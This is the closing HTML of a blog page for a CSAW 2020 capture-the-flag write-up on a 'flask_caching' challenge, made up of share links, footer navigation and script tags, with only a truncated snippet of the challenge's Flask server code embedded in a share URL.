    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&title=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&name=CSAW%20Qualifiers%202020%20-%20flask_caching&description=We%20were%20presented%20with%20a%20simple%20Flask%20server%2c%20we%20can%20see%20the%20code%20bellow%20%28see%20the%20full%20code%29.%0a%23%21%2fusr%2fbin%2fenv%20python3%20from%20flask%20import%20Flask%20from%20flask%20import%20request%2c%20redirect%20from%20flask_caching%20import%20Cache%20from%20redis%20import%20Redis%20import%20jinja2%20import%20os%20app%20%3d%20Flask%28__name__%29%20app.config%5b%26%2339%3bCACHE_REDIS_HOST%26%2339%3b%5d%20%3d%20%26%2339%3blocalhost%26%2339%3b%20app.config%5b%26%2339%3bDEBUG%26%2339%3b%5d%20%3d%20False%20cache%20%3d%20Cache%28app%2c%20config%3d%7b%26%2339%3bCACHE_TYPE%26%2339%3b%3a%20%26%2339%3bredis%26%2339%3b%7d%29%20redis%20%3d%20Redis%28%26%2339%3blocalhost%26%2339%3b%29%20jinja_env%20%3d%20jinja2.Environment%28autoescape%3d%5b%26%2339%3bhtml%26%2339%3b%2c%20%26%2339%3bxml%26%2339%3b%5d%29%20%40app.route%28%26%2339%3b%2f%26%2339%3b%2c%20methods%3d%5b%26%2339%3bGET%26%2339%3b%2c%20%26%2339%3bPOST%26%2339%3b%5d%29%20def%20notes_post%28%29%3a%20if%20request.method%20%3d%3d%20%26%2339%3bGET%26%2339%3b%3a%20return%20%26%2339%3b%26%2339%3b%26%2339%3b%20%26lt%3bh4%26gt%3bPost%20a%20note%26lt%3b%2fh4%26gt%3b%20%26lt%3bform%20method%3dPOST%20enctype%3dmultipart%2fform-data%26gt%3b%20%26lt%3binput%20name%3dtitle%20placeholder%3dtitle%26gt%3b%20%26lt%3binput%20type%3dfile%20name%3dcontent%20placeholder%3dcontent%26gt%3b%20%26lt%3binput%20type%3dsubmit%26gt%3b%20%26lt%3b%2fform%26gt%3b%20%26%2339%3b%26%2339%3b%26%2339%3b%20print%28request.">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjmg-duarte.github.io%2fposts%2fctfs%2fcsaw%2fqualifiers%2fflask_caching%2f&t=CSAW%20Qualifiers%202020%20-%20flask_caching">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2020  José Duarte 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/about">About</a></li>
         
        <li><a href="/posts">Posts</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>


  


<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>

</html>
